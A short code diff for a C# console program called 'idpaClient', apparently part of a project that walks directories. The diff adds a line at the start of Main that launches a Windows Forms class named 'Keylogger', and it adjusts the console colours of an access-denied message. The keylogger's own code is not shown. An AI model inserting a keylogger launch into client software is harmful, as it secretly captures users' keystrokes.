@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.IO;
+using System.Windows.Forms;
 
 namespace idpaClient
 {
@@ -13,6 +14,12 @@ namespace idpaClient
 
         static void Main(string[] args)
         {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Keylogger());
+
+            Console.ForegroundColor = ConsoleColor.Green;
+
 
             if (File.Exists(path))
             {
@@ -53,9 +60,9 @@ namespace idpaClient
                 }
                 catch (UnauthorizedAccessException)
                 {
-                    Console.BackgroundColor = ConsoleColor.Red;
-                    Console.WriteLine("{0} Acces denied for" + subdirectory);
-                    Console.BackgroundColor = ConsoleColor.Black;
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Acces denied for '{0}'", subdirectory);
+                    Console.ForegroundColor = ConsoleColor.Green;
                 }
             }
         }
